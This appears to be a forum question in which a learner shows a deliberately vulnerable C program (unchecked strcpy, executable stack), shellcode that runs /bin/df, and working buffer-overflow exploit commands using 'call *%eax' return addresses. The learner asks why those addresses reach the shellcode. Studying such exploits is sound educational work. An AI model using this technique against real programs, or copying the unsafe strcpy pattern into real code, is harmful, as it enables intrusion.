Given this C program:

    #include <stdio.h>
    #include <string.h>
    
    int main(int argc, char **argv) {
      char buf[1024];
      strcpy(buf, argv[1]);
    }

Built with:

    gcc -m32 -z execstack prog.c -o prog

Given shell code:

    EGG=$(printf '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/df')

The program is exploitable with the commands:

    ./prog $EGG$(python -c 'print "A" * 991 + "\x87\x83\x04\x08"')
    ./prog $EGG$(python -c 'print "A" * 991 + "\x0f\x84\x04\x08"')

where I got the addresses from:

    $ objdump -d prog | grep call.*eax
     8048387:	ff d0                	call   *%eax
     804840f:	ff d0                	call   *%eax

I understand the meaning of the `AAAA` paddings in the middle, I calculated the 991 based on the length of `buf` in the program and the length of `$EGG`.

What I don't understand is why any of these addresses with `call *%eax` trigger the execution of the shellcode copied to the beginning of `buf`. As far as I understand, I'm overwriting the return address with `0x8048387` (or the other one), what I don't understand is why this leads to jumping to the shellcode.

I got this far by reading [Smashing the stack for fun and profit][1]. But the article uses a different approach of guessing a relative address to jump to the shellcode. I'm puzzled by why this more simple, alternative solution works, straight without guesswork.


  [1]: http://insecure.org/stf/smashstack.html
